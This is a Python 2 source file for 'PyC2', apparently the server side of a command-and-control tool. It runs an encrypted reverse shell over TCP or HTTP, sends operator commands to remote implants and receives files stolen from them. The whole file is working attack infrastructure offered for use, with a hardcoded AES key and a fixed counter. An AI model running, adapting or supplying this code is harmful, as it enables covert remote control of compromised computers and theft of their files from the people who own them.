#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
PyC2 - An encrypted TCP and HTTP shell (Server)

* AES Encryption
* Reverse Shell
* HTTP and TCP connections
* File Transfer

	
"""

import socket
import BaseHTTPServer
from Crypto.Cipher import AES
import base64
import os
import cgi
from datetime import datetime

__version__='v0.1'
__description__='''\
  ___________________________________________________________
  
  PyC2 - An encrypted TCP and HTTP shell (Server)
  Author: Mattia Reggiani (info@mattiareggiani.com)
  Github: https://github.com/mattiareggiani/py2c
  ___________________________________________________________
'''

host = "192.168.0.4"
protocol = "TCP" # TCP (port: 443) | HTTP (port: 80)
counter = "H"*16
key = "H"*32

class MyHandler(BaseHTTPServer.BaseHTTPRequestHandler):
	
	def log_message(self, format, *args):
		return
	
	def do_GET(s):
		command = raw_input("PyC2> ")  
		s.send_response(200)            
		s.send_header("Content-type", "text/html")  
		s.end_headers()
		command = encrypt(command)
		s.wfile.write(command)           

	def do_POST(s):
		if s.path == '/transfer':
			try:
				ctype, pdict = cgi.parse_header(s.headers.getheader('content-type'))
				if ctype == 'multipart/form-data' :
				    fs = cgi.FieldStorage( fp = s.rfile, 
							headers = s.headers, 
							environ={ 'REQUEST_METHOD':'POST' }    
						      )
				else:
				    print "[-] Unexpected POST request"
				    
				fs_up = fs['file']
						    
				name = os.getcwd() + "/file_" + str(datetime.now())		
				with open(name, 'wb') as o:  
				    o.write( decrypt(fs_up.file.read()) )
				    print '[+] Transfer completed: ' + name
				    s.send_response(200)
				    s.end_headers()
			except Exception as e:
				print e
				
			return 

		s.send_response(200)
		s.end_headers()
		length  = int(s.headers['Content-Length'])
		postVar = s.rfile.read(length )
		print decrypt(postVar)

def encrypt(message):
    encrypto = AES.new(key, AES.MODE_CTR, counter=lambda: counter)
    return base64.b64encode(encrypto.encrypt(message))

def decrypt(message):
    decrypto = AES.new(key, AES.MODE_CTR, counter=lambda: counter)
    return  decrypto.decrypt(base64.b64decode(message)) 
    
def transfer(conn,command):
	command = encrypt(command)
	conn.send(command)
	name = os.getcwd() + "/file_" + str(datetime.now())
	f = open(name,'wb')
	while True:
		bits = conn.recv(1024)
		bits = decrypt(bits)

		if 'Unable to find out the file' in bits:
			print '[-] Unable to find out the file'
			break
		if bits.endswith('DONE'):
			print '[+] Transfer completed ' + name
			f.close()
			break
		f.write(bits)

def connect():
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    
	s.bind((host, 443))                           
	s.listen(1)                                             
	print '[+] Listening for incoming ' + protocol + ' connection on ' + str(host) + ':443'
	conn, addr = s.accept()     
	
	while True:
		command = raw_input("PyC2> ")
		if 'exit' in command:       
			conn.send('exit')
			conn.close()
			break
		elif 'get' in command:
			transfer(conn,command)
		else:
			command = encrypt(command)
			conn.send(command) 
			print decrypt(conn.recv(1024))

def main ():
	if protocol == "TCP":
		try:
			connect()
		except KeyboardInterrupt:   
			print '[!] Server is terminated'

	elif protocol == "HTTP":
		server_class = BaseHTTPServer.HTTPServer
		httpd = server_class((host, 80), MyHandler)
		try:
			print '[+] Listening for incoming ' + protocol + ' connection on ' + str(host) + ':80'
			httpd.serve_forever()   
		except KeyboardInterrupt:   
			print '[!] Server is terminated'
			httpd.server_close()
	else:
		print "Error protocol"

if __name__ == "__main__":
	main()
